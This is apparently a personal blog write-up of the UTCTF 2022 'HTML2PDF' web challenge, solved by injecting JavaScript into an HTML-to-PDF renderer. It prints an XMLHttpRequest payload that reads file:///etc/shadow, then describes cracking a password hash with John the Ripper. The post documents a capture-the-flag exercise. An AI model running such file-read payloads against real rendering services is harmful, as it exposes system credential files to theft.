---
layout: post
category: writeups
title: "UTCTF 2022"
date: 2022-03-07
head_ctf_categories:
  - web
---
# web

## HTML2PDF

![img_name](/assets/img/UTCTF_2022/html2pdf.png)


We are given a link to a web page.

![img_name](/assets/img/UTCTF_2022/html2pdf_a.png)


I press the Sumbit button and I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_b.png)


and looking at the bottom I see:

![img_name](/assets/img/UTCTF_2022/html2pdf_c.png)


`Rendered by HTML2PDF`: HTML2PDF as the title of the challenge, a glue?

The clue leads me to make some search on the web and I find:

![img_name](/assets/img/UTCTF_2022/html2pdf_d.png)


Interessant! And following the second web link:


![img_name](/assets/img/UTCTF_2022/html2pdf_e.png)

Very interessant! Let's try a simple script:

```html
<h1 id=rd>HA HA HA</h1>
<script>
document.getElementById('rd').innerHTML= 'Hello World';
</script>
```
and I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_f.png)

and with another script I try to get the passwd file:


![img_name](/assets/img/UTCTF_2022/html2pdf_g.png)

I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_h.png)

there's a nice username:`WeakPasswordAdmin`

So I try to get the shadow file using the following script:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/shadow");
x.send();
</script
```

![img_name](/assets/img/UTCTF_2022/html2pdf_i.png)

and I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_l.png)

I can see the  `hash of WeakPasswordAdmin’s password`


I try to use `John the Ripper` for cracking the password:

![img_name](/assets/img/UTCTF_2022/html2pdf_m.png)

“sunshine” is the password!

So after log in with those credentials I get the flag:

![img_name](/assets/img/UTCTF_2022/html2pdf_n.png)



